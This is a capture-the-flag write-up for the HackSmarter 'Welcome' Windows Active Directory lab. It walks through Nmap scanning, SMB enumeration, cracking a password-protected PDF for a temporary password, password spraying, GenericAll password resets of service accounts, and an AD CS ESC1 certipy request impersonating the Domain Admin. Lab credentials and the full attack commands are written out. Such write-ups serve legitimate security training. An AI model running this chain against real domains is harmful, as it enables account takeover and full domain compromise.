---
title: HackSmarter - Welcome
date: 2026-06-29
image: cover.png
tags: [HackSmarter, Easy, Windows, Active Directory]
excerpt: An easy Active Directory box that cracks a password-protected PDF to recover a temporary password, pivots through a GenericAll edge to reset a chain of service accounts, and abuses an AD CS ESC1 template to impersonate the Domain Admin and recover its NT hash.
---

# Welcome

You are a member of the Hack Smarter Red Team. During a phishing engagement, you were able to retrieve credentials for the client's Active Directory environment. Use these credentials to enumerate the environment, elevate your privileges, and demonstrate impact for the client.

### Starting Credentials

```bash
e.hills:Il0vemyj0b2025!
```

### NMAP Scanning

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-06-29 10:02:09Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: WELCOME.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.WELCOME.local
| Issuer: commonName=WELCOME-CA/domainComponent=WELCOME
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-13T16:39:47
| Not valid after:  2026-09-13T16:39:47
| MD5:   2ded:dae3:3ecd:1cc4:58a7:dd02:4f41:2b6d
| SHA-1: aa01:7b70:2f48:f3c8:4aa0:5357:aeb8:93e9:8cbd:53bc
| -----BEGIN CERTIFICATE-----
| MIIF2jCCBMKgAwIBAgITGgAAAAIRVFIkuDGu6gAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBFMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFzAVBgoJkiaJk/IsZAEZFgdXRUxD
| T01FMRMwEQYDVQQDEwpXRUxDT01FLUNBMB4XDTI1MDkxMzE2Mzk0N1oXDTI2MDkx
| MzE2Mzk0N1owHTEbMBkGA1UEAxMSREMwMS5XRUxDT01FLmxvY2FsMIIBIjANBgkq
| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnFISuclgsW7tyBxC0s16AO6xnrVEzPYg
| CpMCjoVOos/RYjSg9pZoRtvd2tdGLWSU9F2W1MwHdnnJQARYWsV82y5IxgcP2tJc
| ApnjCjDmxqefhdyuwUsIHF0U4jxDPEKx/vjgtVbiRrws/HFlcvKiyTPNwOamPak/
| ryUpnrvr4ztu/SsuQpHFat2BqcAaKGlaJuaMmRDlFOxWbGfCvOjXxGqfMmd8vJXD
| r3puFr7ii44xiearPtqWvmLymriMQ5KbIYofIzOEmiDDYStMnnymBgHDDsDtpiky
| 06GBiwU8I8Ud/DHXsATlkVVPHYECBaZUP1rYcIZxXyu8DUp93wd6rQIDAQABo4IC
| 6TCCAuUwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBs
| AGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8E
| BAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcN
| AwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsG
| CWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQU9C/GMH3F
| fBVuN+juj9mPCCk8QZcwHwYDVR0jBBgwFoAUevxCqEh3+zNtgYgqOs6b/JIrIr8w
| gccGA1UdHwSBvzCBvDCBuaCBtqCBs4aBsGxkYXA6Ly8vQ049V0VMQ09NRS1DQSxD
| Tj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2
| aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPVdFTENPTUUsREM9bG9jYWw/Y2VydGlm
| aWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1
| dGlvblBvaW50MIG+BggrBgEFBQcBAQSBsTCBrjCBqwYIKwYBBQUHMAKGgZ5sZGFw
| Oi8vL0NOPVdFTENPTUUtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9V0VMQ09NRSxEQz1s
| b2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA+BgNVHREENzA1oB8GCSsGAQQBgjcZAaASBBAybkv9h/o9Trfl
| IQs4hrJUghJEQzAxLldFTENPTUUubG9jYWwwDQYJKoZIhvcNAQELBQADggEBAF6f
| yq73dipbnRw4I9Yt8eukkZOWsbb+Ge6KDOh8lIGSVjtKgRhC5V6X60F1kGGF44Ib
| ojL9D5ynzGxHtuPc6IdJAQGyT8+MObYm6kFtbgr5ohukP6WXZtWmUCJkVuPAcb2a
| 4VcqOj++BmHDRBY8LjKOHI661A76bqWOwKl5AAqwdVqlLS2flTtUv4O6+vBpJ9Bp
| IZgHxKNtwT8+4SVYN9RreOqrsnFkGWWOI9xSLXhSVWtVPUS1ODcZ7hVBsul5qjsN
| rIAmjO6j9Gqe0wXewRpgzvk71vRhl9Nuu5NvaJ1l4a2NiDXe9GmC1KQcXp7BsS9v
| rfaMH2yDsbThqKTJL+c=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-06-29T10:03:38+00:00; -1s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: WELCOME.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.WELCOME.local
| Issuer: commonName=WELCOME-CA/domainComponent=WELCOME
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-13T16:39:47
| Not valid after:  2026-09-13T16:39:47
| MD5:   2ded:dae3:3ecd:1cc4:58a7:dd02:4f41:2b6d
| SHA-1: aa01:7b70:2f48:f3c8:4aa0:5357:aeb8:93e9:8cbd:53bc
| -----BEGIN CERTIFICATE-----
| MIIF2jCCBMKgAwIBAgITGgAAAAIRVFIkuDGu6gAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBFMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFzAVBgoJkiaJk/IsZAEZFgdXRUxD
| T01FMRMwEQYDVQQDEwpXRUxDT01FLUNBMB4XDTI1MDkxMzE2Mzk0N1oXDTI2MDkx
| MzE2Mzk0N1owHTEbMBkGA1UEAxMSREMwMS5XRUxDT01FLmxvY2FsMIIBIjANBgkq
| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnFISuclgsW7tyBxC0s16AO6xnrVEzPYg
| CpMCjoVOos/RYjSg9pZoRtvd2tdGLWSU9F2W1MwHdnnJQARYWsV82y5IxgcP2tJc
| ApnjCjDmxqefhdyuwUsIHF0U4jxDPEKx/vjgtVbiRrws/HFlcvKiyTPNwOamPak/
| ryUpnrvr4ztu/SsuQpHFat2BqcAaKGlaJuaMmRDlFOxWbGfCvOjXxGqfMmd8vJXD
| r3puFr7ii44xiearPtqWvmLymriMQ5KbIYofIzOEmiDDYStMnnymBgHDDsDtpiky
| 06GBiwU8I8Ud/DHXsATlkVVPHYECBaZUP1rYcIZxXyu8DUp93wd6rQIDAQABo4IC
| 6TCCAuUwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBs
| AGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8E
| BAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcN
| AwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsG
| CWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQU9C/GMH3F
| fBVuN+juj9mPCCk8QZcwHwYDVR0jBBgwFoAUevxCqEh3+zNtgYgqOs6b/JIrIr8w
| gccGA1UdHwSBvzCBvDCBuaCBtqCBs4aBsGxkYXA6Ly8vQ049V0VMQ09NRS1DQSxD
| Tj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2
| aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPVdFTENPTUUsREM9bG9jYWw/Y2VydGlm
| aWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1
| dGlvblBvaW50MIG+BggrBgEFBQcBAQSBsTCBrjCBqwYIKwYBBQUHMAKGgZ5sZGFw
| Oi8vL0NOPVdFTENPTUUtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9V0VMQ09NRSxEQz1s
| b2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA+BgNVHREENzA1oB8GCSsGAQQBgjcZAaASBBAybkv9h/o9Trfl
| IQs4hrJUghJEQzAxLldFTENPTUUubG9jYWwwDQYJKoZIhvcNAQELBQADggEBAF6f
| yq73dipbnRw4I9Yt8eukkZOWsbb+Ge6KDOh8lIGSVjtKgRhC5V6X60F1kGGF44Ib
| ojL9D5ynzGxHtuPc6IdJAQGyT8+MObYm6kFtbgr5ohukP6WXZtWmUCJkVuPAcb2a
| 4VcqOj++BmHDRBY8LjKOHI661A76bqWOwKl5AAqwdVqlLS2flTtUv4O6+vBpJ9Bp
| IZgHxKNtwT8+4SVYN9RreOqrsnFkGWWOI9xSLXhSVWtVPUS1ODcZ7hVBsul5qjsN
| rIAmjO6j9Gqe0wXewRpgzvk71vRhl9Nuu5NvaJ1l4a2NiDXe9GmC1KQcXp7BsS9v
| rfaMH2yDsbThqKTJL+c=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-06-29T10:03:38+00:00; -1s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: WELCOME.local0., Site: Default-First-Site-Name)
|_ssl-date: 2026-06-29T10:03:38+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.WELCOME.local
| Issuer: commonName=WELCOME-CA/domainComponent=WELCOME
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-13T16:39:47
| Not valid after:  2026-09-13T16:39:47
| MD5:   2ded:dae3:3ecd:1cc4:58a7:dd02:4f41:2b6d
| SHA-1: aa01:7b70:2f48:f3c8:4aa0:5357:aeb8:93e9:8cbd:53bc
| -----BEGIN CERTIFICATE-----
| MIIF2jCCBMKgAwIBAgITGgAAAAIRVFIkuDGu6gAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBFMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFzAVBgoJkiaJk/IsZAEZFgdXRUxD
| T01FMRMwEQYDVQQDEwpXRUxDT01FLUNBMB4XDTI1MDkxMzE2Mzk0N1oXDTI2MDkx
| MzE2Mzk0N1owHTEbMBkGA1UEAxMSREMwMS5XRUxDT01FLmxvY2FsMIIBIjANBgkq
| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnFISuclgsW7tyBxC0s16AO6xnrVEzPYg
| CpMCjoVOos/RYjSg9pZoRtvd2tdGLWSU9F2W1MwHdnnJQARYWsV82y5IxgcP2tJc
| ApnjCjDmxqefhdyuwUsIHF0U4jxDPEKx/vjgtVbiRrws/HFlcvKiyTPNwOamPak/
| ryUpnrvr4ztu/SsuQpHFat2BqcAaKGlaJuaMmRDlFOxWbGfCvOjXxGqfMmd8vJXD
| r3puFr7ii44xiearPtqWvmLymriMQ5KbIYofIzOEmiDDYStMnnymBgHDDsDtpiky
| 06GBiwU8I8Ud/DHXsATlkVVPHYECBaZUP1rYcIZxXyu8DUp93wd6rQIDAQABo4IC
| 6TCCAuUwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBs
| AGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8E
| BAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcN
| AwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsG
| CWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQU9C/GMH3F
| fBVuN+juj9mPCCk8QZcwHwYDVR0jBBgwFoAUevxCqEh3+zNtgYgqOs6b/JIrIr8w
| gccGA1UdHwSBvzCBvDCBuaCBtqCBs4aBsGxkYXA6Ly8vQ049V0VMQ09NRS1DQSxD
| Tj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2
| aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPVdFTENPTUUsREM9bG9jYWw/Y2VydGlm
| aWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1
| dGlvblBvaW50MIG+BggrBgEFBQcBAQSBsTCBrjCBqwYIKwYBBQUHMAKGgZ5sZGFw
| Oi8vL0NOPVdFTENPTUUtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9V0VMQ09NRSxEQz1s
| b2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA+BgNVHREENzA1oB8GCSsGAQQBgjcZAaASBBAybkv9h/o9Trfl
| IQs4hrJUghJEQzAxLldFTENPTUUubG9jYWwwDQYJKoZIhvcNAQELBQADggEBAF6f
| yq73dipbnRw4I9Yt8eukkZOWsbb+Ge6KDOh8lIGSVjtKgRhC5V6X60F1kGGF44Ib
| ojL9D5ynzGxHtuPc6IdJAQGyT8+MObYm6kFtbgr5ohukP6WXZtWmUCJkVuPAcb2a
| 4VcqOj++BmHDRBY8LjKOHI661A76bqWOwKl5AAqwdVqlLS2flTtUv4O6+vBpJ9Bp
| IZgHxKNtwT8+4SVYN9RreOqrsnFkGWWOI9xSLXhSVWtVPUS1ODcZ7hVBsul5qjsN
| rIAmjO6j9Gqe0wXewRpgzvk71vRhl9Nuu5NvaJ1l4a2NiDXe9GmC1KQcXp7BsS9v
| rfaMH2yDsbThqKTJL+c=
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: WELCOME.local0., Site: Default-First-Site-Name)
|_ssl-date: 2026-06-29T10:03:38+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.WELCOME.local
| Issuer: commonName=WELCOME-CA/domainComponent=WELCOME
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-13T16:39:47
| Not valid after:  2026-09-13T16:39:47
| MD5:   2ded:dae3:3ecd:1cc4:58a7:dd02:4f41:2b6d
| SHA-1: aa01:7b70:2f48:f3c8:4aa0:5357:aeb8:93e9:8cbd:53bc
| -----BEGIN CERTIFICATE-----
| MIIF2jCCBMKgAwIBAgITGgAAAAIRVFIkuDGu6gAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBFMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFzAVBgoJkiaJk/IsZAEZFgdXRUxD
| T01FMRMwEQYDVQQDEwpXRUxDT01FLUNBMB4XDTI1MDkxMzE2Mzk0N1oXDTI2MDkx
| MzE2Mzk0N1owHTEbMBkGA1UEAxMSREMwMS5XRUxDT01FLmxvY2FsMIIBIjANBgkq
| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnFISuclgsW7tyBxC0s16AO6xnrVEzPYg
| CpMCjoVOos/RYjSg9pZoRtvd2tdGLWSU9F2W1MwHdnnJQARYWsV82y5IxgcP2tJc
| ApnjCjDmxqefhdyuwUsIHF0U4jxDPEKx/vjgtVbiRrws/HFlcvKiyTPNwOamPak/
| ryUpnrvr4ztu/SsuQpHFat2BqcAaKGlaJuaMmRDlFOxWbGfCvOjXxGqfMmd8vJXD
| r3puFr7ii44xiearPtqWvmLymriMQ5KbIYofIzOEmiDDYStMnnymBgHDDsDtpiky
| 06GBiwU8I8Ud/DHXsATlkVVPHYECBaZUP1rYcIZxXyu8DUp93wd6rQIDAQABo4IC
| 6TCCAuUwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBs
| AGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8E
| BAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcN
| AwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsG
| CWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQU9C/GMH3F
| fBVuN+juj9mPCCk8QZcwHwYDVR0jBBgwFoAUevxCqEh3+zNtgYgqOs6b/JIrIr8w
| gccGA1UdHwSBvzCBvDCBuaCBtqCBs4aBsGxkYXA6Ly8vQ049V0VMQ09NRS1DQSxD
| Tj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2
| aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPVdFTENPTUUsREM9bG9jYWw/Y2VydGlm
| aWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1
| dGlvblBvaW50MIG+BggrBgEFBQcBAQSBsTCBrjCBqwYIKwYBBQUHMAKGgZ5sZGFw
| Oi8vL0NOPVdFTENPTUUtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9V0VMQ09NRSxEQz1s
| b2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA+BgNVHREENzA1oB8GCSsGAQQBgjcZAaASBBAybkv9h/o9Trfl
| IQs4hrJUghJEQzAxLldFTENPTUUubG9jYWwwDQYJKoZIhvcNAQELBQADggEBAF6f
| yq73dipbnRw4I9Yt8eukkZOWsbb+Ge6KDOh8lIGSVjtKgRhC5V6X60F1kGGF44Ib
| ojL9D5ynzGxHtuPc6IdJAQGyT8+MObYm6kFtbgr5ohukP6WXZtWmUCJkVuPAcb2a
| 4VcqOj++BmHDRBY8LjKOHI661A76bqWOwKl5AAqwdVqlLS2flTtUv4O6+vBpJ9Bp
| IZgHxKNtwT8+4SVYN9RreOqrsnFkGWWOI9xSLXhSVWtVPUS1ODcZ7hVBsul5qjsN
| rIAmjO6j9Gqe0wXewRpgzvk71vRhl9Nuu5NvaJ1l4a2NiDXe9GmC1KQcXp7BsS9v
| rfaMH2yDsbThqKTJL+c=
|_-----END CERTIFICATE-----
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Issuer: commonName=DC01.WELCOME.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-28T09:52:24
| Not valid after:  2026-12-28T09:52:24
| MD5:   4856:d2d2:8adb:005d:6918:242d:24b7:9ac9
| SHA-1: d3b2:ccb5:c8c8:4e63:efc6:910d:b570:ef43:9ca2:3ee5
| -----BEGIN CERTIFICATE-----
| MIIC6DCCAdCgAwIBAgIQaDpBdzy7lr5PyRIXMeHZJzANBgkqhkiG9w0BAQsFADAd
| MRswGQYDVQQDExJEQzAxLldFTENPTUUubG9jYWwwHhcNMjYwNjI4MDk1MjI0WhcN
| MjYxMjI4MDk1MjI0WjAdMRswGQYDVQQDExJEQzAxLldFTENPTUUubG9jYWwwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCSoMrNQ9kfbLPzX7to9opObbXW
| OlgeEzpPO/b6sHx7hmR62T+gUeIoXZ6iiKp6tzqxZ65wyUdSKLTX9poaLxR2H688
| Vf7OqcePINQY0tpvROkFe5W4D9PxhAwgnRSAxSdOj7ii4EeSXmrrk06DLRNuO1Mj
| tVyW1zcB/Bcp6sTlkXvHrCpaVIwKCoKvVvUl1YYrqM1LKu9ae05u3OYl4g+Jw/q2
| 8cRFJzVzsslG7ZXvNxrn6oulM7cVBKZEkMd5PoMD9IeE3xYoBzixh1y1DLOPEGID
| arabFChAzpHjALdgZQyX/0XUFE6pNBoVliawKWEf0vt3FLhvWHqPjfuGpGidAgMB
| AAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG
| 9w0BAQsFAAOCAQEAV7NM4YuH5p4chqRYG0wDJASHx6gZ+3bz1UvA8E2v/Z4JGOPs
| cPkdKecWxa1kRa+gu2p+LMHv/Vwudn+KJGc5wWhTzdj5eoOQVdsJ9UqUiPE/p77F
| pd9Kb1NEGf2TgVYZT7pRLprbKimyjN4oS/6AGGekixPB3GrmtjwDZhDzI5xFdypK
| N7mHCMX3M+PkjB8GZXmoqQeb/VtFSHtfxf2b8Oq6Fo+8b+aeB6+Hd/rfQpnJ8Jav
| KXygyISHLu68r/fTY1T+6Zm0eRX/YKX0sDOXGOyDrMwV31001seqezF+/vy4GMR8
| chH8FYMil/migzKA4O34FwDGb+naVS6Mx8/50A==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-06-29T10:03:38+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: WELCOME
|   NetBIOS_Domain_Name: WELCOME
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: WELCOME.local
|   DNS_Computer_Name: DC01.WELCOME.local
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-29T10:02:59+00:00
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49681/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49718/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49738/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49883/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-06-29T10:03:03
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 37197/tcp): CLEAN (Timeout)
|   Check 2 (port 36547/tcp): CLEAN (Timeout)
|   Check 3 (port 45558/udp): CLEAN (Timeout)
|   Check 4 (port 12602/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
```

### Active Directory - Domain Reconnaissance

With a valid set of credentials already provided, the first step is enumerating the domain with `rusthound-ce` and reviewing which shares are reachable. Before that, prepare a `krb5.conf` file and map the host into `/etc/hosts`:

```bash
10.1.86.226	DC01.WELCOME.local WELCOME.local
```

{% image %}

Running the collection:

```bash
rusthound --domain WELCOME.LOCAL --ldapusername 'e.hills' --ldappassword 'Il0vemyj0b2025!' --ldapfqdn DC01.WELCOME.LOCAL --ldapip 10.1.86.226 --name-server 10.1.86.226 --collectionmethod All --zip
```

{% image2 %}

The BloodHound graph for `e.hills` reveals no immediately useful paths:

{% image3 %}

### SMB Enumeration

Enumerating the shares this account can reach returns the following:

{% image4 %}

Accessing the share with `impacket-smbclient` to inspect its contents:

{% image5 %}

Downloading each file to examine it locally:

{% image6 %}

The only file of interest is `Welcome Start Guide.pdf`, which is locked behind a password. Extracting its hash with `pdf2john` to crack it offline and unlock the document:

{% image7 %}

The legacy `pdf2john` produces a hash that does not crack, since it does not handle newer PDF encryption schemes correctly. The modern alternative at [https://github.com/benjamin-awd/pdf2john](https://github.com/benjamin-awd/pdf2john) generates a valid hash instead:

{% image8 %}

Cracking the resulting hash with `hashcat`:

{% image9 %}

### Viewing the Welcome Start Guide PDF

Opening the now-unlocked PDF reveals an interesting detail:

{% image10 %}

The document stores a temporary password in cleartext: `Welcome2025!@`. Spraying this password across the known users to find any account that still accepts it:

{% image11 %}

None of the known users accept the password. Pulling a more complete user list from the domain with `ldapsearch`:

```bash
ldapsearch -x -H ldap://10.1.86.226 -b "DC=WELCOME,DC=local" "*" -D "e.hills@WELCOME.local" -w 'Il0vemyj0b2025!'
```

{% image12 %}

The expanded list produces a valid hit on the user `a.harris`. The account had appeared during the earlier enumeration, yet only on this pass do the credentials register as valid:

{% image13 %}

### Active Directory - Lateral Movement

Marking `a.harris` as owned in BloodHound surfaces several Outbound Object Control primitives tied to the account:

{% image14 %}

The `GenericAll` permission allows resetting the password of the user `I.PARK`, and `I.PARK` in turn holds further control of its own:

{% image15 %}

`I.PARK` can reset the passwords of both `SVC_WEB` and `SVC_CA`. The path is straightforward: reset `I.PARK` first, then use that access to reset `SVC_CA` and check the certificate templates that account can reach for anything abusable:

{% image16 %}

With the password of `I.PARK` reset, the next step is resetting the password of the `SVC_CA` user:

{% image17 %}

### Active Directory Certificate Services - Privilege Escalation

Control over the `SVC_CA` user makes it possible to enumerate the certificate templates and CA configuration for any vulnerable entry: `certipy-ad find -u svc_ca@WELCOME.local -p 'Password123!' -dc-ip 10.1.86.226 -vulnerable -stdout`

{% image18 %}

The `Welcome-Template` template on the `WELCOME-CA` certificate authority is vulnerable to ESC1, where the template lets the enrollee supply an arbitrary Subject Alternative Name. This allows requesting a certificate as any account, including the Domain Admin:

```bash
certipy-ad req -u svc_ca@WELCOME.local -p 'Password123!' -dc-ip 10.1.86.226 -target 'DC01.WELCOME.local' -ca 'WELCOME-CA' -template 'Welcome-Template' -upn 'administrator@WELCOME.local' -sid 'S-1-5-21-141921413-1529318470-1830575104-500'
```

{% image19 %}

Using the issued certificate to authenticate through PKINIT and recover the NT hash of the Domain Admin:

{% image20 %}

With the Domain Admin NT hash, authenticating against the DC to collect both the user and root flags:

{% image21 %}